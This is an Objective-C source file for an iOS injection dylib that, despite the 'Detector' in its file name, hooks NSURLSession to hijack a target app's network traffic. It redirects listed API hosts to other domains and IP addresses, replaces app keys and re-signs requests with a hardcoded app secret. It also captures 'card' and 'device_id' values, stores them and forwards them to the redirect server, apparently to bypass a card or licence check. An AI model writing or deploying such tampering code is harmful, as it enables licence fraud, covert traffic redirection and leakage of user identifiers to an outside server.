// URLHijackDetector.m
// iOS URL Hijack Dylib - 使用映射规则分别指定替换目标
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <CommonCrypto/CommonDigest.h>

#pragma mark - 配置区

// 替换映射规则：原始地址 -> 新地址
// 支持域名/IP，支持带端口或不带端口
static NSDictionary<NSString *, NSString *> *getRedirectMapping(void) {
    return @{
        // 域名替换为域名（不带端口）
        @"api1.keyumjan.cn": @"ma.hezijun.top",
        
        // IP替换为IP（带端口）
        @"45.205.27.82:8080": @"61.184.8.198:5562",
        @"45.205.27.47:8088": @"61.184.8.198:5562",
        
        // 可以继续添加更多映射，例如：
        // @"api2.old.com": @"api2.new.com",
        // @"192.168.1.100:9090": @"10.0.0.200:9090",
        // @"api3.old.com:8080": @"api3.new.com:8080",
    };
}

// 需要处理的目标域名/IP（自动从映射规则生成 + 固定目标）
static NSSet<NSString *> *getTargetDomains(void) {
    NSMutableSet *domains = [NSMutableSet setWithArray:@[
        @"api1.7ccccccc.com",
        @"api2.7ccccccc.com", 
        @"api3.7ccccccc.com",
    ]];
    // 添加映射规则中的所有原始地址
    [domains addObjectsFromArray:[getRedirectMapping() allKeys]];
    return domains;
}

// 需要重定向的目标列表（直接从映射规则获取）
static NSSet<NSString *> *getRedirectTargets(void) {
    return [NSSet setWithArray:[getRedirectMapping() allKeys]];
}

// appSecret
static NSString *getAppSecret(void) {
    return @"XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx";
}

// appKey 替换规则
static NSArray<NSDictionary *>* getAppKeyRules(void) {
    return @[
        @{@"old": @"LWtAvVixXX39mGYL2w", @"new": @"QLObIPwnDOVts3mzw9"},
        @{@"old": @"veQ3NZZ5ui0jyBrQaT", @"new": @"QLObIPwnDOVts3mzw9"},
    ];
}

#pragma mark - 持久化存储管理

static NSString *getStorageKey(void) {
    return @"com.hijack.stored_params";
}

static void saveParamsToStorage(NSString *card, NSString *deviceId) {
    if (!card && !deviceId) return;
    
    @synchronized([NSUserDefaults standardUserDefaults]) {
        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
        NSMutableDictionary *storedParams = [[defaults dictionaryForKey:getStorageKey()] mutableCopy];
        if (!storedParams) {
            storedParams = [NSMutableDictionary dictionary];
        }
        
        if (card) {
            storedParams[@"card"] = card;
        }
        if (deviceId) {
            storedParams[@"device_id"] = deviceId;
        }
        
        [defaults setObject:storedParams forKey:getStorageKey()];
        [defaults synchronize];
    }
}

static NSDictionary *loadParamsFromStorage(void) {
    @synchronized([NSUserDefaults standardUserDefaults]) {
        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
        return [defaults dictionaryForKey:getStorageKey()];
    }
}

#pragma mark - 加密工具函数

static NSString* md5(NSString *string) {
    if (!string) return @"";
    
    const char *cStr = [string UTF8String];
    unsigned char digest[CC_MD5_DIGEST_LENGTH];
    CC_MD5(cStr, (CC_LONG)strlen(cStr), digest);
    
    NSMutableString *output = [NSMutableString stringWithCapacity:CC_MD5_DIGEST_LENGTH * 2];
    for(int i = 0; i < CC_MD5_DIGEST_LENGTH; i++) {
        [output appendFormat:@"%02x", digest[i]];
    }
    return output;
}

#pragma mark - 签名计算

static NSString* calculateSign(NSString *httpMethod, NSString *host, NSString *path, NSDictionary *params, NSString *appSecret) {
    if (!params) return @"";
    if (!httpMethod) httpMethod = @"POST";
    if (!path) path = @"";
    if (!appSecret) appSecret = @"";
    
    // 1. 参数排序并拼接
    NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
    NSMutableString *paramString = [NSMutableString string];
    
    for (NSString *key in sortedKeys) {
        if ([key isEqualToString:@"sign"]) continue;
        
        if (paramString.length > 0) {
            [paramString appendString:@"&"];
        }
        
        NSString *value = params[key] ?: @"";
        [paramString appendFormat:@"%@=%@", key, value];
    }
    
    // 2. 拼接签名原串
    NSString *stringToSign;
    if (host && host.length > 0) {
        NSArray *hostParts = [host componentsSeparatedByString:@":"];
        NSString *cleanHost = hostParts.firstObject ?: host;
        stringToSign = [NSString stringWithFormat:@"%@%@%@%@%@", 
                       httpMethod, cleanHost, path, paramString, appSecret];
    } else {
        stringToSign = [NSString stringWithFormat:@"%@%@%@%@", 
                       httpMethod, path, paramString, appSecret];
    }
    
    return md5(stringToSign);
}

#pragma mark - 请求参数修改

// 从URL或Body中提取参数
static NSMutableDictionary* extractParamsFromRequest(NSData *body, NSString *urlString) {
    NSMutableDictionary *params = [NSMutableDictionary dictionary];
    
    // 1. 从 body 中提取
    if (body) {
        NSString *bodyString = [[NSString alloc] initWithData:body encoding:NSUTF8StringEncoding];
        if (bodyString) {
            NSArray *pairs = [bodyString componentsSeparatedByString:@"&"];
            for (NSString *pair in pairs) {
                NSRange range = [pair rangeOfString:@"="];
                if (range.location != NSNotFound) {
                    NSString *key = [pair substringToIndex:range.location];
                    NSString *value = [pair substringFromIndex:range.location + 1];
                    params[key] = value ?: @"";
                }
            }
        }
    }
    
    // 2. 从 URL 中提取（补充）
    if (urlString) {
        NSURL *url = [NSURL URLWithString:urlString];
        if (url) {
            NSURLComponents *components = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
            for (NSURLQueryItem *item in components.queryItems) {
                if (!params[item.name]) {
                    params[item.name] = item.value ?: @"";
                }
            }
        }
    }
    
    return params;
}

// 构建新的请求体
static NSData* buildRequestBodyFromParams(NSDictionary *params) {
    if (!params || params.count == 0) return nil;
    
    NSMutableArray *pairs = [NSMutableArray array];
    
    NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
    for (NSString *key in sortedKeys) {
        if ([key isEqualToString:@"sign"]) continue;
        NSString *value = params[key] ?: @"";
        [pairs addObject:[NSString stringWithFormat:@"%@=%@", key, value]];
    }
    
    if (params[@"sign"]) {
        [pairs addObject:[NSString stringWithFormat:@"sign=%@", params[@"sign"]]];
    }
    
    NSString *bodyString = [pairs componentsJoinedByString:@"&"];
    return [bodyString dataUsingEncoding:NSUTF8StringEncoding];
}

// 处理原始 API 请求 - 统一使用 params={}
static NSData* modifyRequestBodyForOriginalApi(NSData *originalBody, NSString *originalURL, NSString *httpMethod, NSString *host, NSString *path) {
    // 提取所有参数
    NSMutableDictionary *params = extractParamsFromRequest(originalBody, originalURL);
    if (params.count == 0) return originalBody;
    
    // 提取 card 和 device_id
    NSString *card = params[@"card"];
    NSString *deviceId = params[@"device_id"];
    
    if (card || deviceId) {
        saveParamsToStorage(card, deviceId);
    }
    
    // ★★★ 强制统一使用 params={} ★★★
    if (params[@"params"]) {
        params[@"params"] = @"{}";
    }
    
    // 替换 appKey
    NSString *currentAppKey = params[@"appKey"];
    if (currentAppKey) {
        NSString *newAppKey = nil;
        NSArray *rules = getAppKeyRules();
        
        for (NSDictionary *rule in rules) {
            if ([rule[@"old"] isEqualToString:currentAppKey]) {
                newAppKey = rule[@"new"];
                break;
            }
        }
        
        if (newAppKey) {
            params[@"appKey"] = newAppKey;
            
            NSString *newSign = calculateSign(httpMethod, host, path, params, getAppSecret());
            if (newSign && newSign.length > 0) {
                params[@"sign"] = newSign;
            }
            
            NSData *newBody = buildRequestBodyFromParams(params);
            if (newBody) {
                return newBody;
            }
        }
    }
    
    return originalBody;
}

// 处理重定向后的新 API 请求
static NSData* modifyRequestBodyForNewApi(NSData *originalBody, NSString *originalURL) {
    NSMutableDictionary *params = extractParamsFromRequest(originalBody, originalURL);
    
    NSDictionary *storedParams = loadParamsFromStorage();
    
    if (storedParams) {
        NSString *card = storedParams[@"card"];
        NSString *deviceId = storedParams[@"device_id"];
        
        BOOL modified = NO;
        
        if (card && !params[@"card"]) {
            params[@"card"] = card;
            modified = YES;
        }
        
        if (deviceId && !params[@"device_id"]) {
            params[@"device_id"] = deviceId;
            modified = YES;
        }
        
        if (modified) {
            NSData *newBody = buildRequestBodyFromParams(params);
            if (newBody) {
                return newBody;
            }
        }
    }
    
    return originalBody;
}

#pragma mark - URL 匹配与替换（映射规则版）

static NSString* replaceURLIfNeeded(NSString *originalURLString, NSString **outHost, NSString **outPath) {
    NSURL *url = [NSURL URLWithString:originalURLString];
    if (!url) return originalURLString;
    
    NSString *host = url.host;
    if (!host) return originalURLString;
    
    if (outHost) *outHost = host;
    if (outPath) *outPath = url.path ?: @"";
    
    // 构建带端口的 host（如果有）
    NSString *hostWithPort = nil;
    if (url.port) {
        hostWithPort = [NSString stringWithFormat:@"%@:%d", host, [url.port intValue]];
    }
    
    // 检查是否需要替换
    NSString *newHost = nil;
    NSDictionary *mapping = getRedirectMapping();
    
    // 优先匹配带端口的 host
    if (hostWithPort && mapping[hostWithPort]) {
        newHost = mapping[hostWithPort];
    }
    // 匹配不带端口的 host
    else if (mapping[host]) {
        newHost = mapping[host];
    }
    
    if (newHost) {
        NSString *newURLString = originalURLString;
        
        // 替换 host（优先替换带端口的完整字符串）
        if (hostWithPort && mapping[hostWithPort]) {
            newURLString = [newURLString stringByReplacingOccurrencesOfString:hostWithPort 
                                                                   withString:newHost];
        } else {
            newURLString = [newURLString stringByReplacingOccurrencesOfString:host 
                                                                   withString:newHost];
        }
        
        if (outHost) *outHost = newHost;
        
        return newURLString;
    }
    
    return originalURLString;
}

static BOOL isTargetRequest(NSString *urlString) {
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return NO;
    
    NSString *host = url.host;
    if (!host) return NO;
    
    // 检查固定目标域名
    for (NSString *target in getTargetDomains()) {
        if ([host isEqualToString:target]) {
            return YES;
        }
    }
    
    // 检查重定向目标（带端口）
    if (url.port) {
        NSString *hostWithPort = [NSString stringWithFormat:@"%@:%d", host, [url.port intValue]];
        for (NSString *target in getRedirectTargets()) {
            if ([hostWithPort isEqualToString:target]) {
                return YES;
            }
        }
    }
    
    return NO;
}

static BOOL isOriginalApiRequest(NSString *host) {
    if (!host) return NO;
    
    NSSet *targetDomains = getTargetDomains();
    for (NSString *target in targetDomains) {
        if ([target containsString:@":"]) continue;
        if ([host isEqualToString:target]) {
            return YES;
        }
    }
    return NO;
}

static BOOL isRedirectTarget(NSString *host) {
    if (!host) return NO;
    
    for (NSString *target in getRedirectTargets()) {
        if ([host isEqualToString:target]) {
            return YES;
        }
    }
    return NO;
}

#pragma mark - NSURLSession Hook

@interface NSURLSession (Hijack)
@end

@implementation NSURLSession (Hijack)

+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        Class class = [NSURLSession class];
        
        SEL originalSelector = @selector(dataTaskWithRequest:completionHandler:);
        SEL swizzledSelector = @selector(hijacked_dataTaskWithRequest:completionHandler:);
        
        Method originalMethod = class_getInstanceMethod(class, originalSelector);
        Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
        
        if (!originalMethod) {
            class_addMethod(class, originalSelector, 
                          imp_implementationWithBlock(^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
                return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
            }), "@@:@?");
            return;
        }
        
        if (!swizzledMethod) {
            class_addMethod(class, swizzledSelector, 
                          imp_implementationWithBlock(^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
                return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
            }), "@@:@?");
            swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
        }
        
        if (originalMethod && swizzledMethod) {
            method_exchangeImplementations(originalMethod, swizzledMethod);
        }
    });
}

- (NSURLSessionDataTask *)hijacked_dataTaskWithRequest:(NSURLRequest *)request 
                                      completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    
    NSString *originalURLString = request.URL.absoluteString;
    NSMutableURLRequest *mutableRequest = [request mutableCopy];
    BOOL modified = NO;
    
    if (isTargetRequest(originalURLString)) {
        NSString *host = nil;
        NSString *path = nil;
        
        // 1. URL 替换（使用映射规则）
        NSString *newURLString = replaceURLIfNeeded(originalURLString, &host, &path);
        if (![newURLString isEqualToString:originalURLString]) {
            NSURL *newURL = [NSURL URLWithString:newURLString];
            if (newURL) {
                [mutableRequest setURL:newURL];
                modified = YES;
            }
        } else {
            NSURL *url = [NSURL URLWithString:originalURLString];
            host = url.host;
            path = url.path ?: @"";
        }
        
        // 2. 修改请求体
        NSData *originalBody = request.HTTPBody;
        if (originalBody && host) {
            NSData *newBody = nil;
            
            if (isOriginalApiRequest(host)) {
                newBody = modifyRequestBodyForOriginalApi(originalBody, originalURLString, request.HTTPMethod, host, path);
            } else if (isRedirectTarget(host)) {
                newBody = modifyRequestBodyForNewApi(originalBody, originalURLString);
            }
            
            if (newBody && newBody != originalBody) {
                [mutableRequest setHTTPBody:newBody];
                
                NSString *contentLength = [NSString stringWithFormat:@"%lu", (unsigned long)newBody.length];
                [mutableRequest setValue:contentLength forHTTPHeaderField:@"Content-Length"];
                modified = YES;
            }
        }
    }
    
    if (!modified) {
        return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
    }
    
    return [self hijacked_dataTaskWithRequest:mutableRequest completionHandler:completionHandler];
}

@end

__attribute__((constructor))
static void initialize() {
    // 初始化时不输出日志
}
